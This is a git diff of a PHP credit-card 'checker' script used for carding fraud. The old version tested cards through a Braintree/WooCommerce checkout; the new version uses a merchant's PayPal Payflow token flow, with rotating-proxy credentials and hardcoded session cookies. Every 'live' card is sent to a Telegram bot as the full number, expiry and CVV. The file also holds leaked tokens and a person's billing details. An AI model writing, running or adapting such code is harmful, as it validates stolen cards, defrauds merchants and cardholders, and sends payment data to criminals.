@@ -171,6 +171,13 @@ $d1 = getcwd();
 $d = str_replace('\\', '/', $d1);
 $executionStartTime = microtime(true);
 
+$rp1 = array(
+ 1 => 'xdfgglis-rotate:0fozxul6qziy',
+  2 => 'buzcugvr-rotate:na05fj245weq',
+
+    ); 
+    $rotate = $rp1[array_rand($rp1)];
+
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
@@ -186,122 +193,82 @@ curl_close($ch);
  $bank = $data[5][0];
 $cbin = substr($cc, 0,6);
 
-#######START NOW######
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.ryda.com.au/paypal/transparent/requestSecureToken/');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
+$headers[] = 'cookie: PHPSESSID=05fdd9a0adbd385ffab9ff6eb4719044; _gcl_au=1.1.363033982.1614738122; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; form_key=ey85cSnpGAhlrIS1; _ga=GA1.3.1993881439.1614738134; _gid=GA1.3.823455809.1614738134; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; PHPSESSID=05fdd9a0adbd385ffab9ff6eb4719044; X-Magento-Vary=b0ae59cca4ef8fb4e0a3cf9be129e5c85d6f4a59; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; __atrspmx_token=fcd1031cc6f436a522400e8496b061d7bf201667e92c6a82b3410ac45c441893; mage-messages=; zip.checkout.anonymous_id=28d4fb82-c0b9-4aee-b5ce-de727d0087a0; section_data_ids=%7B%22aw-afptc-promo%22%3A1614738443%2C%22cart%22%3A1614739325%2C%22customer%22%3A1614738433%2C%22compare-products%22%3A1614738433%2C%22last-ordered-items%22%3A1614738433%2C%22directory-data%22%3A1614738433%2C%22captcha%22%3A1614738433%2C%22wishlist%22%3A1614738433%2C%22instant-purchase%22%3A1614738433%2C%22multiplewishlist%22%3A1614738433%2C%22persistent%22%3A1614738433%2C%22review%22%3A1614738433%2C%22recently_viewed_product%22%3A1614738433%2C%22recently_compared_product%22%3A1614738433%2C%22product_data_storage%22%3A1614738433%2C%22paypal-billing-agreement%22%3A1614738433%2C%22checkout-fields%22%3A1614738433%2C%22collection-point-result%22%3A1614738433%2C%22pickup-location-result%22%3A1614738433%2C%22messages%22%3A1614739325%7D; private_content_version=0152d7ea67e4d4cb0bd270513f1a7cf9; _nx-nocache=1';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_key=ey85cSnpGAhlrIS1&payment%5Bmethod%5D=payflowpro&captcha_form_id=co-payment-form&controller=checkout_flow&cc_type='.$cbin.'');
+$result1 = curl_exec($ch);
+$sectok = GetStr($result1, '"securetoken":"','",');
+$secid = GetStr($result1, '"securetokenid":"','"');
 
-//////--------FIRST CURL GRAPHQL------------////
+
+
+
+
 $ch = curl_init();
-//PROXY
-curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b4ac5c06-bc95-473b-b19a-6fb975173fe7"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
+curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://payflowlink.paypal.com/');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_POST, 1);
 $headers = array();
-$headers[] = 'Host: payments.braintree-api.com';
-$headers[] = 'Accept: */*';
-$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MTYzMTg1NDAsImp0aSI6IjI5OGNjY2VmLWQzNTMtNGIzMS04YmI2LWIxNDNlODJjZjRhMSIsInN1YiI6Inc5Nmt5cDU1Y3FwcW41Z3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5Nmt5cDU1Y3FwcW41Z3IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.6Rjz6qowqIlr2BnphPmfpjYvokWLN8DilgK6h6T_1nNcyPt2dSiv3Tn8hkOw0QURhy8-9b1clOHIOZXhlACOvg';
-$headers[] = 'Content-Type: application/json';
-$headers[] = 'Origin: https://assets.braintreegateway.com';
-$headers[] = 'Referer: https://assets.braintreegateway.com/';
-$headers[] = 'braintree-version: 2018-05-10';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36';
-$headers[] = 'Sec-Fetch-Mode: same-site';
-$headers[] = 'Sec-Fetch-Mode: no-cors';
-$headers[] = 'Sec-Fetch-Mode: script';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+//$headers[] = 'cookie: KHcl0EuY7AKSMgfvHl7J5E7hPtK=S9QFleCKZX3CiexOT-a7U-blBF9RVLmi4cmaVSmoIPIgi4R2wxBdnW-ALl9CslEPBq__r0Nx1tS7kOAY; cookie_check=yes; _gcl_au=1.1.706975343.1613944106; login_email=jackhayabusa%40gmail.com; ui_experience=d_id%3D4MaZyLdjKf3SP1JdrBrEEqDD52UA9eoa1613944503994%26login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D3%253A1615154236590; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IlpGenFMUW5yVVZzMnczNEVpczVaWVg5Q0stS0JuVnI2RXpJU19UMWVZUkh2dmROS0ZKWVcwNVVSdjlYY09EbnFiLThNak96dG1nSTRDYzlMYTdLSFBqTnZWTlhsWGlpZmRWdnhzUE92azBKUlBMbGV5WUhVNE01aGJfS01MRS14S3FGbUprcTdKa01NLTJWYjR5UUk5T0xyRVdPZGowQjJ6Rkw0dVJGbUVucHRqRk9RalRxcEgwbDhLRFBmaG5qNXdLOHpsWDhwOXdVWkpxcW5nSDg2T09pd2FfUyIsImlhdCI6MTYxNDU4NjMxMCwiZXhwIjoxNjE0NTg5OTEwfQ.hYyMNNTcRVanjKKwBwQ4woeICNAOItlduSCccN_yPP8; ts_c=vr%3Df6aff6971760a1d5415da749fb8e5819%26vt%3Df3e028041770a760b643d439fe86bb3b; _gcl_aw=GCL.1614704303.Cj0KCQiA4feBBhC9ARIsABp_nbVKeu2-dhyrD0AlFayL4I4CGevBeogAOg7Tps53nQtmspk6nCGU_OEaAjzOEALw_wcB; _gcl_dc=GCL.1614704303.Cj0KCQiA4feBBhC9ARIsABp_nbVKeu2-dhyrD0AlFayL4I4CGevBeogAOg7Tps53nQtmspk6nCGU_OEaAjzOEALw_wcB; fn_dt=91fd4345c22f430f8528270a613336f4; id_token=idtoken8bde0c9af0394aeb9f4f593e34e2d8bb; rmuc=NNabCz11gyHZDwnOMS2CIgGz_EGQrBJiHEs9j_N8bW8tWM-gtMDsL6ZJLW-oJN9RNpWAnscu85nOEB_HPAyYNO1zyo1lBDAr8dQGVvqVtE_aqvTcQ6kyFQkcZ3BUQgVb7Kum6GbvV2BDxm0Ml0wCGDNfEmKpwpyVvO6cxvR35ZRjqVDUk6QQYXnMOMRdgCFkeQpLVhT0B82urPRjPxNx0T0UzJ9bxb4wPR9EQtwYv4TxY1RLb550ZE2I4y6ZYvjTx6tNEI01hR4lWpgNezlA2SPcSn9xU0V9oY9BJFKdvdmaBQ1FRkzjj_hoti-f3rVhzL4-pG; X-PP-ADS=AToB0W4-YLgg9w5LvGq8TFGuZHkGuQc; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; HaC80bwXscjqZ7KM6VOxULOB534=51cDORBXBkO-2laZzA6PBNSHH2OR2zZ9cTUx8Zurw2D4e4mZvNbUG0koT7JnomRuxi0ls4REiz4aBN1D2rIJEHS13SUFX7fT4AS_wt6hsc0cjE0_gOqXg5zqQsywRFoButHpm0; x-pp-s=eyJ0IjoiMTYxNDcwNDc1MzQ4MyIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1709399163%26vteXpYrS%3D1614706563%26vr%3Df6aff6971760a1d5415da749fb8e5819%26vt%3Df3e028041770a760b643d439fe86bb3b%26vtyp%3Dreturn';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-$resulta = curl_exec($ch);
-$token = trim(strip_tags(getStr($resulta,'"token":"','"')));
-#echo "<br>token: $token";
-//////////////////////////[ErrorFound404]//////////=========[Graphl]
-//$ch = curl_init();
-//curl_setopt($ch, CURLOPT_PROXY, 'nosmwbwz-rotate:80');
-//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'nosmwbwz-rotate:u5uei2b48zh8');
-////////-----------2ND CURL CHECKOUT-------//////
-$ch = curl_init();
-//PROXY
-curl_setopt($ch, CURLOPT_URL, 'https://whitefire-publishing.com/read/?wc-ajax=checkout');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Charlene&billing_last_name=Ganda&billing_company=&billing_country=US&billing_address_1=26517+Danti+Court&billing_address_2=Account+No.%C2%A052-546944&billing_city=Hayward&billing_state=CA&billing_postcode=96590&billing_phone=6508730750&billing_email=bertolabsu125763%40gmail.com&order_comments=&wc-points-rewards-max-points=0&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=14.97&wc_braintree_credit_card_payment_nonce='.$token.'&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=14.97&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&terms=on&terms-field=1&woocommerce-process-checkout-nonce=bdfb1b29c2&_wp_http_referer=%2Fread%2F%3Fwc-ajax%3Dupdate_order_review');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
-$headers = array();
-$headers[] = 'Host: whitefire-publishing.com';
-$headers[] = 'x-requested-with: XMLHttpRequest';
-//$headers[] = 'Upgrade-Insecure-Requests:1';
-//$heasers[] = 'Cache-Control:max-age=0';
-$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
-$headers[] = 'Cookie: wp_woocommerce_session_ad5cefb29f2d4e012793c687d31082f3=722fc8678b968977d9fcd83c92e151ab%7C%7C1616251221%7C%7C1616247621%7C%7C7c902a6c74e0b570fbdfa7f020156b3e; woocommerce_items_in_cart=1; woocommerce_cart_hash=4f19b47467d8270255244ad7ddb48327; _ga=GA1.2.48530751.1616078268; sib_cuid=b9d05401-04d4-4047-bf1c-067a875a625e; etBloomCookie_optin_2=true; et_bloom_optin_optin_2_33_imp=true; _gid=GA1.2.34866678.1616232082; SGPBShowingLimitationDomain4403={"openingCount":1,"openingPage":""}';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'Origin: https://whitefire-publishing.com';
-$headers[] = 'Referer: https://whitefire-publishing.com/read/checkout/';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36';
-$headers[] = 'Sec-Fetch-Mode: cors';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-$pagamento = curl_exec($ch);
-$message = trim(strip_tags(getStr($pagamento,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n')));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'result=0&securetoken='.$sectok.'&securetokenid='.$secid.'&respmsg=Approved&result_code=0&csc='.$cvv.'&expdate='.$mes.''.$ano.'&acct='.$cc.'&form_key=ey85cSnpGAhlrIS1');
+
+
 
 $result = curl_exec($ch);
-$message = trim(strip_tags(getStr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n')));
+$cvc = GetStr($result, '<input type="hidden" name="PROCCVV2" value="','"/>');
+$avsres = GetStr($result, '<input type="hidden" name="AVSDATA" value="','"/>');
+$mesg = GetStr($result, '<input type="hidden" name="RESPMSG" value="','"/>');
+$respo = GetStr($result, '"code": "','",');
+$resp = GetStr($result, '"message": "','"');
+$message = trim(strip_tags(getStr($result,'"messages":"','"')));
 curl_close($ch);
 
-switch ($result) {
-    case strpos($message == 'The provided address does not match the billing address for cardholder. Please verify the address and try again'):
+switch ($mesg) {
+    case strpos($cvc == 'M'):
     $head = 'Payflow = LIVE';
         
         break;
     
     default:
         $stats = 'Dead';
-        break; 
+        break;
 }
-if ($result == 'The provided address does not match the billing address for cardholder. Please verify the address and try again') {
+if ($cvc == 'M') {
   $head = '✅ PAYFLOW AUTH - LIVE';
   $stats = 'Approved';
-$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
-$chat_id = "1291071243";
-$message = "✅ APPROVED CVV - AUTH
-<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'
-<b>🔎BRAND: </b>'.$vendor.'
-<b>🔎TYPE: </b>'.$type.'
-<b>🔎LEVEL: </b>'.$level.'
-<b>🔎BANK: </b>'.$bank.' 
-<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
-<b>📝CHECKED BY:</b> '.$username.'
-<b>🔔Response: CVV MATCHED ✓
-<b>©️Made By: JUICY";
-$bot_url    =  "https://api.telegram.org/bot$botToken/";
-$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
-file_get_contents($url);
-
-$bot_url    =  "https://api.telegram.org/bot$botToken/";
-$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
-file_get_contents($url);
-} 
-elseif ($result == 'The card verification number does not match. Please re-enter and try again.")) {
-$botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
-$chat_id = "1291071243";
-$message = "✅ APPROVED CCN - AUTH
-<b>💳Card: </b>'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.''
-<b>🔎BRAND: </b>'.$vendor.'
-<b>🔎TYPE: </b>'.$type.'
-<b>🔎LEVEL: </b>'.$level.'
-<b>🔎BANK: </b>'.$bank.' 
-<b>🔎COUNTRY: </b>'.$country.' '.$flag.'
-<b>📝CHECKED BY:</b> '.$username.'
-<b>🔔Response:CCN MATCH ✓
-<b>©️Made By: JUICY";
-$bot_url    =  "https://api.telegram.org/bot$botToken/";
-$url = $bot_url."sendMessage?chat_id=".$chatid."&text=".urlencode($message);
-file_get_contents($url);
-
+  $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw";
+$chat_id = $chatid
+$message = "APPROVED CVV
+Card: $cc|$mes|$ano|$cvv
+Response: AUTH
+Made By: Moneris ";
 $bot_url    =  "https://api.telegram.org/bot$botToken/";
 $url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
 file_get_contents($url);
 }
+
 else{
-  $head = 'CHECKER JUICY';
+  $head = '❌PAYFLOW = DEAD';
 }
 
 $response = '
